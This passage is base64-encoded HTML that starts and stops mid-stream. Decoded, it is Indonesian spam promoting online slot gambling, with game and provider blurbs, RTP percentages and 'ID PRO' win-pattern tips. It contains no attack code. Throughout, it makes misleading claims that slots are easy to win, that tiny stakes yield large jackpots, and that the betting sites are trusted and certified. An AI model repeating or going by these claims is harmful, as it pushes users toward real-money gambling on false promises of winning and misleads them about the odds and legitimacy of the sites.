3Bhbj48L3A+CiAgICAgICAgICAgICAgICA8cD48Yj5Qb3NlaWRvbiAoIE1pY3JvR2FtaW5nICk8L2I+PC9wPgogICAgICAgICAgICAgICAgPHA+PHNwYW4gc3R5bGU9ImZvbnQtd2VpZ2h0OiA0MDA7Ij5Qb3NlaWRvbiBhZGFsYWggc2FsYWggc2F0dSBwZXJtYWluYW4gZmF2b3JpdCBNaWNyb0dhbWluZywgZGVuZ2FuIHRhcnVoYW4gbWluaW11bSB5YW5nIHNhbmdhdCBrZWNpbCwgbXVsYWkgZGFyaSAxMDAgcGVyYWsgZGVuZ2FuIHRpbmdrYXQga2VtZW5hbmdhbiBoaW5nZ2EgODglLiBQZXJtYWluYW4gaW5pIG1lcnVwYWthbiBzYWxhaCBzYXR1IHBlcm1haW5hbiB5YW5nIGJpc2EgZGlwaWxpaCBvbGVoIHBhcmEgYmV0dG9yLCBqZW5pcyBwZXJtYWluYW4geWFuZyB1bmlrIGRpYmFuZGluZ2thbiBkZW5nYW4geWFuZyBsYWluIG1lbmphZGlrYW4gcGVybWFpbmFuIGluaSBzYWxhaCBzYXR1IHBpbGloYW4gdW50dWsgZGltYWlua2FuLjwvc3Bhbj48L3A+CiAgICAgICAgICAgICAgICA8cD48Yj5Kb2tlciBKZXdlbHMgKCBTbG90ODggKTwvYj48L3A+CiAgICAgICAgICAgICAgICA8cD48c3BhbiBzdHlsZT0iZm9udC13ZWlnaHQ6IDQwMDsiPkpva2VyIEpld2VscyBhZGFsYWggZ2FtZSBsZWdlbmRhcmlzL3BhbGluZyBzZW5pb3IgZGkgYW50YXJhIGdhbWUtZ2FtZSBkaSBhdGFzLiBEZW5nYW4gbW9kYWwgbWluaW1hbCB0YXJ1aGFuIDUwMCBydXBpYWggZGFuIDMgYmFyIHNhamEsIGFuZGEgYmlzYSBtZW5kYXBhdGthbiBqYWNrcG90IGhpbmdnYSAxIGp1dGEgcnVwaWFoIGRlbmdhbiBtb2RhbCA1MDAgc2FqYS4gVGFtcGlsYW4geWFuZyBtdWRhaCBkaWxpaGF0IGRhbiBhbmltYXNpIHlhbmcgdGlkYWsgdGVybGFsdSBiYW55YWsgbWVtYnVhdCBnYW1lIGluaSBtZW5qYWRpIGZhdm9yaXQgc2VtdWEgb3JhbmcgZGVuZ2FuIHRpbmdrYXQga2VtZW5hbmdhbiBoaW5nZ2EgOTMlITwvc3Bhbj48L3A+CiAgICAgICAgICAgICAgICA8cD48Yj5HZW5pZSAzIFdpc2hlcyAoIFBHIFNsb3RzICk8L2I+PC9wPgogICAgICAgICAgICAgICAgPHA+PHNwYW4gc3R5bGU9ImZvbnQtd2VpZ2h0OiA0MDA7Ij5HZW5pZSAzIEhhcmFwa2FuIHNsb3QgdXRhbWEgZGFyaSBQRyBTbG90cyBzZWxhaW4gTWFoam9uZyBXYXlzLCBwZXJtYWluYW4gc2xvdCAzLWJhciBkZW5nYW4gV2lsZCAmYW1wOyBTY2F0dGVyIGRhbiBhbmltYXNpIHlhbmcgbHVhciBiaWFzYS4gSW5pIGFkYWxhaCBzYWxhaCBzYXR1IGplbmlzIElEIFBSTyB5YW5nIGRpZ3VuYWthbiBzZWJhZ2FpIGJhaGFuIGJyYW5kaW5nIG9sZWggcHJvdmlkZXIgUEcgU2xvdHMsIGthcmVuYSBtZXJla2Egc2lidWsgbWVtYXNhcmthbiBwcm9ncmFtL2dhbWUgbWVyZWthLiBNZXJla2EgbWVtYmVyaWthbiBqYXRhaCBqYWNrcG90IHlhbmcgbGViaWggc2VkZXJoYW5hIGRhbGFtIHBlcm1haW5hbiBHZW5pZSAzIFdpc2hlcyBpbmksIHNlaGluZ2dhIGJpc2EgZGlqYWRpa2FuIHNlYmFnYWkgYmFoYW4gcGVyY29iYWFuIHBhcmEgYmV0dG9yIHVudHVrIG1lbmRhcGF0a2FuIEpBQ0tQT1QgdGVyc2VidXQuPC9zcGFuPjwvcD4KICAgICAgICAgICAgICAgIDxwPjxiPkdhdGVzIG9mIEdhdG90IEthY2EgKCBQcmFnbWF0aWMgUGxheSApPC9iPjwvcD4KICAgICAgICAgICAgICAgIDxwPjxzcGFuIHN0eWxlPSJmb250LXdlaWdodDogNDAwOyI+R2F0ZXMgb2YgR2F0b3QgS2FjYSBtZXJ1cGFrYW4gc2FsYWggc2F0dSBzbG90IGFuZGFsYW4gZGFyaSBQcmFnbWF0aWMgUGxheSwgc2VidWFoIHNsb3QgZ2FtZSBkZW5nYW4gNCBTY2F0dGVycyBkYW4gdGFtcGlsYW4gYW5pbWFzaSB0ZXJiYWlrIHNlcGVydGkgR2F0ZXMgb2YgT2x5bXB1cy4gSW5pIGFkYWxhaCBzYWxhaCBzYXR1IGplbmlzIFBSTyBJRCB0ZXJiYXJ1IHlhbmcgcGFsaW5nIHNlcmluZyBkaWphZGlrYW4gYmFoYW4gdW50dWsgbWVuY2FyaSBrZXVudHVuZ2FuIGJlc2FyLiBNZXJla2EgbWVueWVkaWFrYW4ganVkaSBzbG90IG9ubGluZSBqYWNrcG90IHRlcmJlc2FyIHlhbmcgbGViaWggbXVkYWggZGlkYXBhdGthbiB1bnR1ayBwZXJtYWluYW4gaW5pLiBKYWRpIEFuZGEgYmlzYSBtZW1idWF0IHNpdHVzIElEIFBSTyBnYW1lIGhhcmkgaW5pIHVudHVrIG1lbmRhcGF0a2FuIHNlbnNhc2kgaGluZ2dhIG1heHdpbi4gSmFuZ2FuIGx1cGEgZGkgZGFsYW0gZ2FtZSBJRCBQUk8geWFuZyBzYXR1IGluaSBhbmRhIGJpc2EgbGFuZ3N1bmcgbWVtYmVsaSBmaXR1ciBib251cyB1bnR1ayBtZW5kYXBhdGthbiBrZW1lbmFuZ2FuIHlhbmcgYmVzYXI8L3NwYW4+PC9wPgoKICAgICAgICAgICAgICAgIDxoMj43IFJla29tZW5kYXNpIERhZnRhciBSVFAgSUQgUFJPIEhhcmkgSW5pIE11ZGFoIE1lbmFuZzwvaDI+CgogICAgICAgICAgICAgICAgPHA+PHNwYW4gc3R5bGU9ImZvbnQtd2VpZ2h0OiA0MDA7Ij5QZXJtYWluYW4gc2xvdCBtZXJ1cGFrYW4gcGVybWFpbmFuIHlhbmcgdGVwYXQga2V0aWthIGluZ2luIG1lbmdpc2kgd2FrdHUgbHVhbmcuIEJ1a2FuIGhhbnlhIHBlcm1haW5hbiB5YW5nIG1lbnllbmFuZ2thbiB1bnR1ayBkaW1haW5rYW4uIElEIFBSTyBkYXBhdCBtZW1iZXJpIEFuZGEga2V1bmdndWxhbiBkZW5nYW4gc2F0dSBwdXRhcmFuIGRpIHNldGlhcCBwZXJ0YW5kaW5nYW4uIFNldGlhcCBtZXNpbiBzbG90IGFrYW4gZGliZXJpa2FuIFJUUCBkYW4gd2luIHJhdGUgeWFuZyBiZXJiZWRhLWJlZGEsIGphZGkgYmFnaSBhbmRhIHlhbmcgYWthbiBiZXJtYWluIG1lc2luIHNsb3Qgc2ViYWlrbnlhIG1lbmNhcmkgbWVzaW4gZGVuZ2FuIHJhdGUgbGl2ZSBJRCBQUk8gUlRQIHRlcnRpbmdnaSBkaSBrZWxhc255YS48L3NwYW4+PC9wPgogICAgICAgICAgICAgICAgPHA+PHNwYW4gc3R5bGU9ImZvbnQtd2VpZ2h0OiA0MDA7Ij5TZXBlcnRpIHlhbmcgc3VkYWgga2FtaSBqZWxhc2thbiBiYW55YWsgdW50dWsgbWVtaWxpaCBqdWRpIElEIFBSTywgYWRhIGJlYmVyYXBhIGZha3RvciB5YW5nIHBlcmx1IGFuZGEgcGVyaGF0aWthbi4gSmlrYSBBbmRhIG1hc2loIHJhZ3UtcmFndSwgamFuZ2FuIGtoYXdhdGlyLCBrYXJlbmEgc2VrYXJhbmcgQW5kYSBiZXJhZGEgZGkgc2l0dXMgSUQgUFJPIHRlcnBlcmNheWEuIFBSTyBJRCBhZGFsYWggUFJPIElEIGJvIHlhbmcgbWVtYmVyaWthbiBiYW55YWsga2V1bnR1bmdhbiBkaSBzZXRpYXAgcGVybWFpbmFuLiBUaWRhayBoYW55YSBrZXVudHVuZ2FuLCBrYW1pIGp1Z2EgbWVueWVkaWFrYW4gamFja3BvdCBQUk8gSUQgcGFsaW5nIHNlbnNhc2lvbmFsIHVudHVrIEFuZGEgZGFwYXRrYW4uIFRhbnBhIG1lbnVuZ2d1IGxhbWEgbGFnaSwgYmVyaWt1dCA3IHJla29tZW5kYXNpIGRhZnRhciBydHAgc2xvdCBvbmxpbmUgcHJhZ21hdGlzIGhhcmkgaW5pOjwvc3Bhbj48L3A+CiAgICAgICAgICAgICAgICA8cD48Yj5TbG90IEdhY29yIE1heHdpbiBQcmFnbWF0aWMgUGxheTwvYj48L3A+CiAgICAgICAgICAgICAgICA8cD48c3BhbiBzdHlsZT0iZm9udC13ZWlnaHQ6IDQwMDsiPlNsb3QgZ2FtZSBQcmFnbWF0aWMgYWRhbGFoIHNhbGFoIHNhdHUgZGFmdGFyIHNsb3QgZGVuZ2FuIGplbmlzIGRhbiB2YXJpYXNpIElEIFBSTyB5YW5nIGJlcmJlZGEuIFNldGlhcCB0YWh1biBQcmFnbWF0aWMgUGxheSBTbG90cyBtZW55ZWRpYWthbiBwZW1iYXJ1YW4gc2lzdGVtIGRlbmdhbiBtZW5naGFkaXJrYW4gSUQgUFJPIHRlcmJhcnUuIFByYWdtYXRpYyBHYW1lcyBtZW1hbmcgZGFmdGFyIElEIFBSTyB0ZXJiYWlrIGRpYW50YXJhIHByb3ZpZGVyIGxhaW5ueWEsIHNlbGFsdSBtZW5ndXRhbWFrYW4gdGFtcGlsYW4gZGFuIGtlbGFuY2FyYW4gZGFsYW0gYmVybWFpbi4gR2FtZSBwcmFnbWF0aXMgSUQgUFJPIG1lbmphZGkgcGlsaWhhbiBwZXJ0YW1hIGJhZ2kgcGFyYSBwZW1haW4gc2xvdCB5YW5nIGFrYW4gYmVydGFydWguIEJlYmVyYXBhIElEUFJPIGRhcmkgcGVueWVkaWEgZ2FtZSBwcmFnbWF0aXMgbWVtaWxpa2kgc2tvciByYXRhLXJhdGEgZGkgUlRQIElEIFBSTyBzZWJlc2FyIDk3LDIwJSBzZWhpbmdnYSBwZW1haW4gdGlkYWsgYWthbiBtZXJhc2EgZGlydWdpa2FuIGRlbmdhbiBnYW1lIHByYWdtYXRpcyBJRCBQUk8uPC9zcGFuPjwvcD4KICAgICAgICAgICAgICAgIDxwPjxiPlNsb3QgR2Fjb3IgTWF4d2luIE1pY3JvZ2FtaW5nPC9iPjwvcD4KICAgICAgICAgICAgICAgIDxwPjxzcGFuIHN0eWxlPSJmb250LXdlaWdodDogNDAwOyI+QWdlbiBtaWNybyBnYW1lIElEIFBSTyB0aWRhayBrYWxhaCBzZXJ1bnlhIGRlbmdhbiBwcm92aWRlciBnYW1lIHByYWdtYXRpcy4gTWljcm9nYW1pbmcgbWVtaWxpa2kgYmFueWFrIElEIFBSTyBkZW5nYW4gc2xvdCBsaXZlIFJUUCB5YW5nIGJpYXNhbnlhIGRpc2lhcmthbiBsYW5nc3VuZyBvbGVoIGJlYmVyYXBhIGRhZnRhciBqdWRpIElEIFBSTyBkaSBJbmRvbmVzaWEuIE1pY3JvZ2FtaW5nIG1lbWlsaWtpIHZhcmlhc2kgdGFydWhhbiB5YW5nIHNhbmdhdCBiYW55YWsgc2VoaW5nZ2EgcGVtYWluIHRpZGFrIGFrYW4gcGVybmFoIGJvc2FuIHNhYXQgbWVtYWlua2FuIHRhcnVoYW4gdWFuZyBhc2xpIGRpIHNpdHVzIG1pY3JvZ2FtaW5nIElEIFBSTy4gQW5kYSBiaXNhIG1lbmdha3NlcyBwcm92aWRlciBpbmkgZGVuZ2FuIG11ZGFoLCBoYW55YSBkZW5nYW4gbWVuZ2d1bmFrYW4gc21hcnRwaG9uZS4gQW5kYSBraW5pIGJpc2EgbWVtYXNhbmcgdGFydWhhbiBqdWRpIHNsb3Qgb25saW5lIGRpbWFuYXB1biBkYW4ga2FwYW5wdW4gYW5kYSBtYXUuPC9zcGFuPjwvcD4KICAgICAgICAgICAgICAgIDxwPjxiPlNsb3QgR2Fjb3IgTWF4d2luIEpva2VyMTIzIEdhbWluZzwvYj48L3A+CiAgICAgICAgICAgICAgICA8cD48c3BhbiBzdHlsZT0iZm9udC13ZWlnaHQ6IDQwMDsiPlNsb3QgSm9rZXIgYWRhbGFoIHNsb3QgZ2Fjb3Igb25saW5lIHRlcmJhaWsgZGkgSW5kb25lc2lhLiBQZXJtYWluYW4gSm9rZXIgc2VyaW5nIGRpc2VidXQgc2ViYWdhaSBzbG90IGpva2VyMTIzLiBJbmkgbWVtaWxpa2kga29uZWtzaSB5YW5nIGN1a3VwIHRlcmtlbmFsIGRpIGFudGFyYSBJRCBQUk8gb25saW5lLiBHYW1lIGpva2VyIG1hbXB1IG1lbWFuZW4gcGFzYXIgQXNpYSwgdGlkYWsgaGFueWEgZGkgcGFzYXIgQXNpYSBzYWphLiBKb2tlcjEyMyBzZXJpbmcgYmVyaGFzaWwgYmVyc2FpbmcgZGVuZ2FuIHByb3ZpZGVyIHRlcm5hbWEgc2VwZXJ0aSBnYW1lIHByYWdtYXRpcy4gU2ViZW5hcm55YSBwYWRhIGRhc2FybnlhIFBSTyBJRCBvbmxpbmUgc3VkYWggamFyYW5nIGRpbWFpbmthbiBvbGVoIGJhbnlhayBwZW1haW4gc2xvdCBiYXJ1LCBuYW11biBoYWwgdGVyc2VidXQgdGlkYWsgbWVtYnVhdCBwZW5nZWxvbGEgc2xvdCBqb2tlcjEyMyBwdXR1cyBhc2EuIE5hbXVuIHNlcmluZ2thbGkgcGVybWFpbmFuIGpva2VyIG1lbWJlcmlrYW4gYmFueWFrIGJvbnVzIHBlcm1haW5hbiBzbG90IG9ubGluZS48L3NwYW4+PC9wPgogICAgICAgICAgICAgICAgPHA+PGI+U2xvdCBHYWNvciBNYXh3aW4gU2xvdDg4PC9iPjwvcD4KICAgICAgICAgICAgICAgIDxwPjxzcGFuIHN0eWxlPSJmb250LXdlaWdodDogNDAwOyI+SnVkaSBzbG90ODggbWVydXBha2FuIHNhbGFoIHNhdHUgamVuaXMgcHJvdmlkZXIgeWFuZyBtdWRhaCB1bnR1ayBkaW1haW5rYW4uIEJpc2EgZGliaWxhbmcgc2xvdDg4IGFkYWxhaCBzYWxhaCBzYXR1IHNpdHVzIFBSTyBJRCB0ZXJiYWlrLiBCaWFzYW55YSBwYXJhIHBlbXVsYSBha2FuIG1lbXVsYWkgdGFydWhhbiBwZXJ0YW1hIG1lcmVrYSBkZW5nYW4gYmVybWFpbiBTbG90ODguIE1lbmdhcGEgZGVtaWtpYW4/IEthcmVuYSBiZWJlcmFwYSBzbG90dGVyIHNhbXBhaSBwYWRhIGtlc2ltcHVsYW4gYmFod2Egc2l0dXMgc2xvdDg4IG1lbWlsaWtpIG5pbGFpIFJUUCBJRCBQUk8geWFuZyBjdWt1cCBtZW5ndW50dW5na2FuIGJhZ2kgcGFyYSBwZW1haW4gYmFydS4gSmFkaSBiaXNhIGRpc2ltcHVsa2FuIGJhaHdhIHNpdHVzIElEIFBSTyBtZW1pbGlraSB0aW5na2F0IGtlc3VsaXRhbiB5YW5nIGJpc2EgZGlrYXRha2FuIHRpZGFrIGN1a3VwIHN1bGl0LiBTbG90ODggdGVudHVueWEgc3VkYWggbWVtaWxpa2kgc2VydGlmaWthc2kgcmVzbWkgZGFyaSBiZXJiYWdhaSBsZW1iYWdhIHBlcmp1ZGlhbi4gSmFkaSBhbmRhIHRpZGFrIHBlcmx1IGtoYXdhdGlyIHNhYXQgYmVybWFpbiBJRCBQUk8gb25saW5lIGRhcmkgcHJvdmlkZXIgaW5pLiBLYXJlbmEgc2VtdWEgZ2FtZSBtZW1lbnVoaSBzdGFuZGFyIGRhbiBwZXJzeWFyYXRhbi48L3NwYW4+PC9wPgogICAgICAgICAgICAgICAgPHA+PGI+U2xvdCBHYWNvciBNYXh3aW4gSGFiYW5lcm88L2I+PC9wPgogICAgICAgICAgICAgICAgPHA+PHNwYW4gc3R5bGU9ImZvbnQtd2VpZ2h0OiA0MDA7Ij5IYWJhbmVybyBhZGFsYWggcGVydXNhaGFhbiB5YW5nIGJlcmRpcmkgZGkgbmVnYXJhIEFzaWEgc2VqYWsgdGFodW4gMjAxMC4gQmVyZm9rdXMgcGFkYSBwZXJtYWluYW4ganVkaSwgc2ViYWdhaSBzaXR1cyBzbG90IGhhYmFuZXJvIHRlcnVzIG1lbmluZ2thdGthbiBrZWNhbmdnaWhhbiBzZW11YSBQUk8gSUQgb25saW5lIHlhbmcgZGl0YXdhcmthbm55YS4gQmVybWFpbiBkaSBzaXR1cyBzbG90IG9ubGluZSB0ZW50dW55YSBtZW1pbGlraSBiYW55YWsga2V1bnR1bmdhbiwgYXBhbGFnaSBqaWthIGJlcm1haW4gZGkgaGFiYW5lcm8gSUQgUFJPLiBGaXR1ciB1bmdndWxhbiB5YW5nIGRpc2VkaWFrYW4gaGFiYW5lcm8gc2xvdHMgYWRhbGFoIGZpdHVyIHNpc3RlbSBub24gYm90LCBkaW1hbmEgc2V0aWFwIG1lc2luIHNsb3QgeWFuZyBtZW5nZWx1YXJrYW4gcG9sYSBQUk8gSUQgdGlkYWsgYWRhIGdhbmdndWFuIGRhcmkgc2lzdGVtIGtvbXB1dGVyLiBTZWhpbmdnYSBiaXNhIGRpa2F0YWthbiBzaXR1cyBzbG90IHRlcmJhaWsgaW5pIG1lbWlsaWtpIHBlcm1haW5hbiB5YW5nIGZhaXIuPC9zcGFuPjwvcD4KICAgICAgICAgICAgICAgIDxwPjxiPlNsb3QgR2Fjb3IgTWF4d2luIFNwYWRlZ2FtaW5nPC9iPjwvcD4KICAgICAgICAgICAgICAgIDxwPjxzcGFuIHN0eWxlPSJmb250LXdlaWdodDogNDAwOyI+SmlrYSBBbmRhIGluZ2luIG1lbmRhcGF0a2FuIGphY2twb3QgeWFuZyBzYW5nYXQgYmVzYXIgZGFyaSBzaXR1cyBzbG90IHNwYWRlZ2FtaW5nLCBBbmRhIGhhcnVzIGRhcGF0IG1lbWlsaWggZ2FtZSBzcGFkZWdhbWluZyBzZWJhZ2FpIFBSTyBJRC4gS2FyZW5hIHByb3ZpZGVyIGp1ZGkgc2xvdCBvbmxpbmUgaW5pIG1lbWlsaWtpIG1heHdpbiBqYWNrcG90IHlhbmcgbWVsZWJpaGkgcmF0YS1yYXRhIHByb3ZpZGVyIGxhaW5ueWEuIFNwYWRlZ2FtaW5nIG1lbWlsaWtpIG5pbGFpIFJUUCBJRCBQUk8gc2ViZXNhciA5Mi05NCUuIFRhbXBpbGFuIGRhbiBmaXR1ciB5YW5nIGRpc2VkaWFrYW4gb2xlaCBzaXR1cyBzbG90IHNwYWRlZ2FtaW5nIHRpZGFrIGthbGFoIG1lbmFyaWsgZGFyaSB5YW5nIGxhaW4uIEppa2EgYW5kYSBpbmdpbiBtZW5nZXRhaHVpIG5pbGFpIGphY2twb3RueWEsIGFuZGEgYmlzYSBsYW5nc3VuZyBtZW1haW5rYW4gc3BhZGVnYW1pbmcgSUQgUFJPIHJlc21pLjwvc3Bhbj48L3A+CiAgICAgICAgICAgICAgICA8cD48Yj5TbG90IEdhY29yIE1heHdpbiBQRyBTb2Z0PC9iPjwvcD4KICAgICAgICAgICAgICAgIDxwPjxzcGFuIHN0eWxlPSJmb250LXdlaWdodDogNDAwOyI+U2l0dXMganVkaSBzbG90IHRlcmJhaWsgZGFuIHRlcnBlcmNheWEgbm9tb3IgMSBzZXBlcnRpIFBHIFNvZnQgYmlzYSBkaXBhc3Rpa2FuIGJpc2EgbWVuZGFwYXRrYW4gamFja3BvdCBzZW5zYXNpb25hbCBkYXJpIG1lc2luIHRlcnNlYnV0LiBCZXJkaXJpIHNlamFrIDIwMTUsIHBnIHNsb3RzIG1lbWlsaWtpIHJhdHVzYW4gSUQgUFJPIHRlcmJhaWsgeWFuZyBzZXRpYXAgdGFodW5ueWEgbWVuZ2hhZGlya2FuIDIwMCBnYW1lIHRlcmJhcnUgdW50dWsgcGFyYSBwZW1haW4uIERlbmdhbiB0YW1waWxhbiBkYW4ga2VhbWFuYW4gc2lzdGVtIHBlcm1haW5hbiwgcGVybWFpbmFuIGp1ZGkgc2xvdCBwZyBJRCBQUk8gbWVuamFkaSBpbmNhcmFuIHBhcmEgcGVtYWluLiBEaWR1a3VuZyBvbGVoIGxlbWJhZ2EganVkaSBzaXR1cyBqdWRpIHNsb3Qgb25saW5lIHRlcmJhaWsgcGcgc2xvdHMgbWVtaWxpa2kgbmlsYWkgUlRQIElEIFBSTyBzZWJlc2FyIDg5LTkyJS48L3NwYW4+PC9wPgogICAgICAgICAgICAgICAgPHA+PHNwYW4gc3R5bGU9ImZvbnQtd2VpZ2h0OiA0MDA7Ij5EYXJpIGJlYmVyYXBhIHJla29tZW5kYXNpIGluaSwgc2Vtb2dhIG1lbXVkYWhrYW4gQW5kYSB1bnR1ayBtZW1pbGloLCBiZWJlcmFwYSBkYWZ0YXIgSUQgUFJPLiBQZXJsdSBkaWluZ2F0IGJhaHdhIHNldGlhcCBtZXNpbiBtZW1pbGlraSBuaWxhaSBJRCBQUk8gcnRwIHlhbmcgYmVyYmVkYSwgamFkaSBqYW5nYW4gc2FtcGFpIHNhbGFoLjwvc3Bhbj48L3A+CgogICAgICAgICAgICAgICAgPGgyPkluZm8gQm9jb3JhbiBJRCBQcm8gU2xvdCBHYWNvciBHYW1wYW5nIE1lbmFuZyBIYXJpIEluaTwvaDI+CgogICAgICAgICAgICAgICAgPHA+PHNwYW4gc3R5bGU9ImZvbnQtd2VpZ2h0OiA0MDA7Ij5BZ2FyIGFuZGEgYmlzYSBtZW5hbmcgc2FhdCBiZXJtYWluIGp1ZGkgc2xvdCwgYW5kYSBwZXJsdSBtZW5nZXRhaHVpIHBvbGEgSUQgUFJPIG1hbGFtIGluaSB5YW5nIGFrYW4ga2FtaSBiZXJpdGFodWthbiBuYW50aS4gU2ViZWx1bSBtZW1iYWNhIGluZm9ybWFzaSB0ZW50YW5nIHBvbGEgcnRwIElEIFBSTyB0ZXJ0aW5nZ2ksIEFuZGEganVnYSBwZXJsdSBtZW5nZXRhaHVpIGt1bXB1bGFuIGJvY29yYW4gSUQgUFJPIHlhbmcgbXVkYWggbWVuYW5nLCBzZXBlcnRpOjwvc3Bhbj48L3A+CiAgICAgICAgICAgICAgICA8cD48Yj5TTE9UIElEIFBSTyBXaWxkIFdlc3QgR29sZDwvYj48L3A+CiAgICAgICAgICAgICAgICA8cD48c3BhbiBzdHlsZT0iZm9udC13ZWlnaHQ6IDQwMDsiPkRpIGRhZnRhciBwZXJ0YW1hIGJvY29yYW4gSUQgUFJPIHlhbmcgbXVkYWggZGltZW5hbmdrYW4gaGFyaSBpbmkgMjAyMiBhZGFsYWggbGluayBzbG90IFdpbGQgV2VzdCBHb2xkLiBJRCBQUk8gYmVzdXRhbiBQcmFnbWF0aWMgUGxheSBzYW5nYXQgcG9wdWxlciBkaSBrYWxhbmdhbiBwZW1haW4gc2xvdCByZXNtaS4gTmlsYWkgUlRQIHRlcnRpbmdnaSBkYXJpIGdhbWUgaW5pIGFkYWxhaCA5Nyw2OCUuPC9zcGFuPjwvcD4KICAgICAgICAgICAgICAgIDxwPjxiPlNMT1QgSUQgUFJPIFN3ZWV0IEJvbmFuemE8L2I+PC9wPgogICAgICAgICAgICAgICAgPHA+PHNwYW4gc3R5bGU9ImZvbnQtd2VpZ2h0OiA0MDA7Ij5JRCBQUk8gU3dlZXQgQm9uYW56YSBtYXNpaCBoYWRpciBkYXJpIHByb3ZpZGVyIFByYWdtYXRpYyBQbGF5LiBCaWFyIGdhY29yLCBiYW55YWsga29udGVuIGRpIFlvdVR1YmUgSW5kb25lc2lhIHlhbmcgbWVtYmFoYXMgcGVybWFpbmFuIGp1ZGkgc2xvdCBTd2VldCBCb25hbnphIHNlYmFnYWkgcmVmZXJlbnNpIGJlcm1haW4gc2xvdCB0ZXJiYWlrIGthcmVuYSBuaWxhaSBSVFAgeWFuZyBzYW5nYXQgdGluZ2dpIHlhaXR1IHNla2l0YXIgOTcsNTMlLjwvc3Bhbj48L3A+CiAgICAgICAgICAgICAgICA8cD48Yj5TTE9UIElEIFBSTyBHcmVhdCBSaGlubyBNZWdhd2F5czwvYj48L3A+CiAgICAgICAgICAgICAgICA8cD48c3BhbiBzdHlsZT0iZm9udC13ZWlnaHQ6IDQwMDsiPkdhbWUgSUQgUFJPIGxhaW5ueWEgZGFyaSBQcmFnbWF0aWMgUGxheSBhZGFsYWggR3JlYXQgUmhpbm8gTWVnYXdheXMuIFBlcm1haW5hbiBzbG90IG9ubGluZSBpbmkgbWVuZ2FtYmlsIHRlbWEgYmluYXRhbmcgYXRhdSBzYWZhcmkgc2VoaW5nZ2EgbWVtYnVhdCBwZXJtYWluYW4gc2VtYWtpbiBzZXJ1IHVudHVrIGRpbWFpbmthbi4gU2VsYWluIGl0dSBSVFAganVnYSBtZW5qYWRpIHBvbGEgUFJPIElEIGhhcmkgaW5pIG1lbmNhcGFpIDk3LDUzJS48L3NwYW4+PC9wPgogICAgICAgICAgICAgICAgPHA+PGI+U0xPVCBJRCBQUk8gSm9rZXIncyBKZXdlbHM8L2I+PC9wPgogICAgICAgICAgICAgICAgPHA+PHNwYW4gc3R5bGU9ImZvbnQtd2VpZ2h0OiA0MDA7Ij5Kb2tlcidzIEpld2VscyBJRCBQUk8gb25saW5lIGJpc2EgYW5kYSBtYWlua2FuIGRpIHByb3ZpZGVyIHNlcGVydGkgUHJhZ21hdGljIFBsYXksIGRlbmdhbiBncmFmaXMgbHVjdSBhbGEgam9rZXIuIExpbmsgc2xvdCB0ZXJzZWJ1dCBiZXJhc2FsIGRhcmkgU2xvdDg4IHlhbmcgdGVya2VuYWwgc2ViYWdhaSBzYWxhaCBzYXR1IHBlbnllZGlhIHNpdHVzIGp1ZGkgc2xvdCBvbmxpbmUgeWFuZyBtdWRhaCBtZW5hbmcuPC9zcGFuPjwvcD4KICAgICAgICAgICAgICAgIDxwPjxiPlNMT1QgSUQgUFJPIFRoZSBEZWFkIEVzY2FwZTwvYj48L3A+CiAgICAgICAgICAgICAgICA8cD48c3BhbiBzdHlsZT0iZm9udC13ZWlnaHQ6IDQwMDsiPkxhbHUgbWFzdWsga2F0ZWdvcmkgc2xvdCBvbmxpbmUgamFja3BvdCBzZWRlcmhhbmEgYmVybmFtYSBUaGUgRGVhZCBFc2NhcGUuIERpYnVhdCBvbGVoIHBlcnVzYWhhYW4gU2xvdDg4IHNlbGFsdSB0ZXJrZW5hbCBkYWxhbSBtZW5jaXB0YWthbiBqdWRpIHNsb3Qgb25saW5lIGphY2twb3QgdGVyYmVzYXIgZGVuZ2FuIGZpdHVyIHlhbmcgc2FuZ2F0IG11bXB1bmkuIERhbiByZXR1cm4gdG8gZ2FtZSBwbGF5ZXIgcmF0ZSBqdWdhIG1lbmNhcGFpIDk2LDEwJS48L3NwYW4+PC9wPgogICAgICAgICAgICAgICAgPHA+PGI+U0xPVCBJRCBQUk8gTWFoam9uZyBXYXlzPC9iPjwvcD4KICAgICAgICAgICAgICAgIDxwPjxzcGFuIHN0eWxlPSJmb250LXdlaWdodDogNDAwOyI+UGFkYSBkYWZ0YXIgSUQgUFJPIG1hbGFtIGluaSwgc2VsYW5qdXRueWEgZGlzZWJ1dCBNYWhqb25nIFdheXMuIEdpbSBpbmkgbWVtYnVhdCB2ZXJzaSBrZWR1YS4gUEcgU29mdCBtZW1pbGlraSB0YW1waWxhbiBraGFzIHlhbmcgbWVuZ2FtYmlsIHRlbWEgcGVybWFpbmFuIG1haGpvbmcgeWFuZyBraW5pIGJpc2EgZGltYWlua2FuIHNlY2FyYSBvbmxpbmUgZGFuIGJpc2EgbWVuZ2hhc2lsa2FuIGJhbnlhayB1YW5nLiBUaW5na2F0IElEIFBSTyBSVFAgbWVuY2FwYWkgOTYsNDAlLjwvc3Bhbj48L3A+CiAgICAgICAgICAgICAgICA8cD48Yj5TTE9UIElEIFBSTyBIb3QgSG90IEZydWl0PC9iPjwvcD4KICAgICAgICAgICAgICAgIDxwPjxzcGFuIHN0eWxlPSJmb250LXdlaWdodDogNDAwOyI+SGFiYW5lcm8gc2xvdCBvbmxpbmUgcHJvdmlkZXIgSG90IEhvdCBGcnVpdCBiaXNhIGFuZGEgbWFpbmthbiBiZXJzYW1hIGthbWkgeWFpdHUgSUQgUFJPIHNlYmFnYWkgZGFmdGFyIHNpdHVzIGp1ZGkgc2xvdCBvbmxpbmUgcmVzbWkgdGVycGVyY2F5YS4gVGFtcGlsYW4ganVkaSBzbG90IGdhY29yIGJlcnRlbWEgYnVhaCB0cm9waXMgdGVybGFsdSBtZW1hbmpha2FuIG1hdGEuIEluZm8gUlRQIElEIFBSTyBtYWxhbSBpbmkganVnYSBjdWt1cCB0aW5nZ2kgeWFpdHUgOTYsOTAlLjwvc3Bhbj48L3A+CiAgICAgICAgICAgICAgICA8cD48Yj5TTE9UIElEIFBSTyBRdWVlbiBvZiBBbGV4YW5kcmlhPC9iPjwvcD4KICAgICAgICAgICAgICAgIDxwPjxzcGFuIHN0eWxlPSJmb250LXdlaWdodDogNDAwOyI+TGFsdSBhZGEgc2xvdCBvbmxpbmUgYmVybmFtYSBRdWVlbiBvZiBBbGV4YW5kcmlhIHlhbmcgZGl0YXdhcmthbiBvbGVoIHNpdHVzIHNsb3Qgb25saW5lIE1pY3JvZ2FtaW5nLiBSZXR1cm4gdG8gUGxheWVyIGRhcmkgcGVybWFpbmFuIGp1ZGkgc2xvdCBpbmkgbWVtYmVyaWthbiBrZXVudHVuZ2FuIHNlYmVzYXIgOTUsNzUlLjwvc3Bhbj48L3A+CiAgICAgICAgICAgICAgICA8cD48Yj5TTE9UIElEIF